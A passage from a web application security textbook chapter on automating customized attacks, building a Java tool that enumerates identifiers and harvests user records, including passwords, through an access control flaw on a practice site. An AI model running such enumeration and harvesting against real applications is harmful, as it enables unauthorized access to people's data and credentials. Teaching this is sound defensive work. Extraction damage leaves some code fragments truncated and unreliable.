Stuttard c14.indd V3 - 08/11/2011 Page 579
Chapter 14 n Automating Customized Attacks 579
In the document enumeration example, the parameter we want to vary contains
a numeric value, so our fi rst implementation of the PayloadSource interface is
a class to generate numeric payloads. This class allows us to specify the range
of numbers we want to test:
class PSNumbers implements PayloadSource
{
int from, to, step, current;
PSNumbers(int from, int to, int step)
{
this.from = from;
this.to = to;
this.step = step;
reset();
}
public boolean nextPayload()
{
current += step;
return current = params.length)
return false;
if (!params[currentParam].attack)
{
currentParam++;
return nextRequest();
}
if (!payloads.nextPayload())
{
payloads.reset();
currentParam++;
return nextRequest();
}
return true;
}
This stateful request engine keeps track of which parameter we are currently
targeting and which attack payload to place into it. The next step is to actually
build a complete HTTP request using this information. This involves inserting
each type of parameter into the correct place in the request and adding any
other required headers:
String buildRequest()
{
// build parameters
StringBuffer urlParams = new StringBuffer();
StringBuffer cookieParams = new StringBuffer();
StringBuffer bodyParams = new StringBuffer();
for (int i = 0; i  0)
req.append(“?” + urlParams.substring(0, urlParams.length() - 1));
req.append(“ HTTP/1.0\r\nHost: “ + host);
if (cookieParams.length() > 0)
req.append(“\r\nCookie: “ + cookieParams.toString());
if (bodyParams.length() > 0)
{
req.append(“\r\nContent-Type: application/x-www-form-urlencoded”);
req.append(“\r\nContent-Length: “ + (bodyParams.length() - 1));
req.append(“\r\n\r\n”);
req.append(bodyParams.substring(0, bodyParams.length() - 1));
}
else req.append(“\r\n\r\n”);
return req.toString();
}
NOTE If you write your own code to generate POST requests, you need to
include a valid Content-Length header that specifi es the actual length of the
HTTP body in each request, as in the preceding code. If an invalid Content-
Length is submitted, most web servers either truncate the data you submit or
wait indefi nitely for more data to be supplied.
To send our requests, we need to open network connections to the target web
server. Java makes it easy to open a TCP connection, submit data, and read the
server’s response:
String issueRequest(String req) throws UnknownHostException, IOException
{
Socket socket = new Socket(host, port);
OutputStream os = socket.getOutputStream();
os.write(req.getBytes());
os.flush();
BufferedReader br = new BufferedReader(new InputStreamReader(
socket.getInputStream()));
StringBuffer response = new StringBuffer();
cc1144..iinndddd 558811 88//1199//22001111 1122::1155::2211 PPMM
Stuttard c14.indd V3 - 08/11/2011 Page 582
582 Chapter 14 n Automating Customized Attacks
String line;
while (null != (line = br.readLine()))
response.append(line);
os.close();
br.close();
return response.toString();
}
Having obtained the server’s response to each request, we need to parse it to
extract the relevant information to enable us to identify hits in our attack. Let’s
start by simply recording two interesting items — the HTTP status code from
the fi rst line of the response and the total length of the response:
String parseResponse(String response)
{
StringBuffer output = new StringBuffer();
output.append(response.split(“\\s+”, 3)[1] + “\t”);
output.append(Integer.toString(response.length()) + “\t”);
return output.toString();
}
Finally, we now have everything in place to launch our attack. We just need
some simple wrapper code to call each of the preceding methods in turn and
print the results until all our requests have been made and nextRequest returns
false:
void doAttack()
{
System.out.println(“param\tpayload\tstatus\tlength”);
String output = null;
while (nextRequest())
{
try
{
output = parseResponse(issueRequest(buildRequest()));
}
catch (Exception e)
{
output = e.toString();
}
System.out.println(params[currentParam].name + “\t” +
payloads.getPayload() + “\t” + output);
}
}
public static void main(String[] args)
cc1144..iinndddd 558822 88//1199//22001111 1122::1155::2222 PPMM
Stuttard c14.indd V3 - 08/11/2011 Page 583
Chapter 14 n Automating Customized Attacks 583
{
new JAttack().doAttack();
}
That’s it! To compile and run this code, you need to download the Java SDK
and JRE from Sun and then execute the following:
> javac JAttack.java
> java JAttack
In our sample confi guration, the tool’s output is as follows:
param payload status length
PageNo 10060 500 3154
PageNo 10061 500 3154
PageNo 10062 200 1083
PageNo 10063 200 1080
PageNo 10064 500 3154
...
Assuming a normal network connection and amount of processing power,
JAttack can issue hundreds of individual requests per minute and output the
pertinent details. This lets you quickly fi nd valid document identifi ers for fur-
ther investigation.
TRY IT!
http://mdsec.net/app/
It may appear that the attack just illustrated is no more sophisticated than the
original bash script example, which required only a few lines of code. However,
because of how JAttack is engineered, it is easy to modify it to deliver much
more sophisticated attacks, incorporating multiple request parameters, a vari-
ety of payload sources, and arbitrarily complex processing of responses. In the
following sections, we will make some minor additions to JAttack’s code that
will make it considerably more powerful.
Harvesting Useful Data
The second main use of customized automation when attacking an application
is to extract useful or sensitive data by using specifi c crafted requests to retrieve
the information one item at a time. This situation most commonly arises when
you have identifi ed an exploitable vulnerability, such as an access control fl aw,
that enables you to access an unauthorized resource by specifying an identifi er
for it. However, it may also arise when the application is functioning entirely as
cc1144..iinndddd 558833 88//1199//22001111 1122::1155::2222 PPMM
Stuttard c14.indd V3 - 08/11/2011 Page 584
584 Chapter 14 n Automating Customized Attacks
intended by its designers. Here are some examples of cases where automated
data harvesting may be useful:
n An online retailing application contains a facility for registered customers
to view their pending orders. However, if you can determine the order
numbers assigned to other customers, you can view their order informa-
tion in the same way as your own.
n A forgotten password function relies on a user-confi gurable challenge.
You can submit an arbitrary username and view the associated challenge.
By iterating through a list of enumerated or guessed usernames, you can
obtain a large list of users’ password challenges to identify those that are
easily guessable.
n A work fl ow application contains a function to display some basic account
information about a given user, including her privilege level within the
application. By iterating through the range of user IDs in use, you can
obtain a listing of all administrative users, which can be used as the basis
for password guessing and other attacks.
The basic approach to using automation to harvest data is essentially similar
to the enumeration of valid identifi ers, except that you are now not only inter-
ested in a binary result (a hit or a miss) but also are seeking to extract some of
the content of each response in a usable form.
Consider the following request, which is made by a logged-in user to show
his account information:
GET /auth/498/YourDetails.ashx?uid=198 HTTP/1.1
Host: mdsec.net
Cookie: SessionId=0947F6DC9A66D29F15362D031B337797
Although this application function is accessible only by authenticated users,
an access control vulnerability exists, which means that any user can view the
details of any other user by simply modifying the uid parameter. In a further
vulnerability, the details disclosed also include the user’s full credentials. Given
the low value of the uid parameter for our user, it should be easy to predict
other users’ identifi ers.
When a user’s details are displayed, the page source contains the personal
data within an HTML table like the following:
Name: Phill Bellend
Username: phillb
cc1144..iinndddd 558844 88//1199//22001111 1122::1155::2222 PPMM
Stuttard c14.indd V3 - 08/11/2011 Page 585
Chapter 14 n Automating Customized Attacks 585
Password: b3ll3nd
...
Given the application’s behavior, it is straightforward to mount a customized
automated attack to harvest all the user information, including credentials, held
within the application.
To do so, let’s make some quick enhancements to the JAttack tool to enable
it to extract and log specifi c data from within the server’s responses. First, we
can add to the attack confi guration data a list of the strings within the source
code that identify the interesting content we want to extract:
static final String[] extractStrings = new String[]
{
“Name: ”,
“Username: ”,
“Password: ”
};
Second, we can add the following to the parseResponse method to search
each response for each of these strings and extract what comes next, up until
the angle bracket that follows it:
for (String extract : extractStrings)
{
int from = response.indexOf(extract);
if (from == -1)
continue;
from += extract.length();
int to = response.indexOf(“<”, from);
if (to == -1)
to = response.length();
output.append(response.subSequence(from, to) + “\t”);
}
That is all we need to change within the tool’s actual code. To confi gure JAttack
to target the actual request in which we are interested, we need to update its
attack confi guration as follows:
String url = “/auth/498/YourDetails.ashx”;
Param[] params = new Param[]